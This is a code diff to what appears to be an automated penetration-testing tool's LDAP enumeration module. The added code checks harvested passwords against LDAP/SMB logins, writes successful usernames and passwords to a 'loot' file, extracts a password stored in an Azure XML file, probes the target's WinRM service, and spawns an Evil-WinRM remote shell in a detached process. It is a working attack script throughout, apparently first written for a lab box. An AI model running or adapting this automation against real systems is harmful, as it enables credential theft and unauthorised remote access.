@@ -164,6 +164,15 @@ class LdapEnum:
                         print(err)
                         return 1
 
+            def usernameAndPassword(creds):
+                if os.path.exists(c.getPath("wordlists", "ldapUsernames")):
+                    try:
+                        acc_check_cmd2 = c.getCmd("ldap", "authChecker", password=creds)
+                        call(acc_check_cmd2, shell=True)
+                    except IOError as err:
+                        print(err)
+                        return 1
+
             def parse_acc_check():
                 if os.path.exists(c.getPath("smb", "smbAuthCheck")):
                     try:
@@ -178,6 +187,25 @@ class LdapEnum:
                                 d = dict(regex.findall(str(successful_login_check).replace("'", "").replace('"', '').replace(']', '')))
                                 valid_pass = d['password']
                                 return valid_pass
+
+                    except FileNotFoundError as fnf_err:
+                        print(fnf_err)
+                        return 1
+
+            def parse_acc_check_two():
+                if os.path.exists(c.getPath("smb", "smbAuthCheck2")):
+                    try:
+                        with open(c.getPath("smb", "smbAuthCheck2"), "r") as smbAuth:
+                            successful_login_check = [x for x in sorted(set(line.rstrip() for line in smbAuth)) if x.startswith("        SUCCESS....")]
+                            # print(successful_login_check)
+                            if successful_login_check:
+                                with open(c.getPath("loot", "creds2"), "a") as authenticated_users:
+                                    for i in successful_login_check:
+                                        authenticated_users.write(i.lstrip())
+                                regex = re.compile(r"\b(\w+)\s*:\s*([^:]*)(?=\s+\w+\s*:|$)")
+                                d = dict(regex.findall(str(successful_login_check).replace("'", "").replace('"', '').replace(']', '').replace(' and', '')))
+                                valid_user = d['username']
+                                return valid_user
 
                     except FileNotFoundError as fnf_err:
                         print(fnf_err)
@@ -201,16 +229,22 @@ class LdapEnum:
                                 doc = xmltodict.parse(azure_file.read())
                                 azure_pass = doc['Objs']['Obj']['Props']['S']['#text']
                                 try:
-                                    dope = f"""{c.getCmd("winrm", "evilWinRM", username='mhope', password=azure_pass, SHELL="$SHELL")}"""
-                                    print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
-                                    print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{azure_pass}{fg.rs}")
-                                    print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
-                                    print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
-                                    print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
-                                    kwargs = {}
-                                    kwargs.update(start_new_session=True)
-                                    revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
-                                    assert not revshell.poll()
+                                    usernameAndPassword(azure_pass)
+                                    auth_user = parse_acc_check_two()
+                                    r = requests.post(f"http://{self.target}:5985/wsman", data="")
+                                    if r.status_code == 401:
+                                        if azure_pass:
+                                            if auth_user:
+                                                dope = f"""{c.getCmd("winrm", "evilWinRM", username=auth_user, password=azure_pass, SHELL="$SHELL")}"""
+                                                print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
+                                                print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{azure_pass}{fg.rs}")
+                                                print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
+                                                print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
+                                                print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
+                                                kwargs = {}
+                                                kwargs.update(start_new_session=True)
+                                                revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
+                                                assert not revshell.poll()
 
                                 except IOError as e:
                                     print(e)
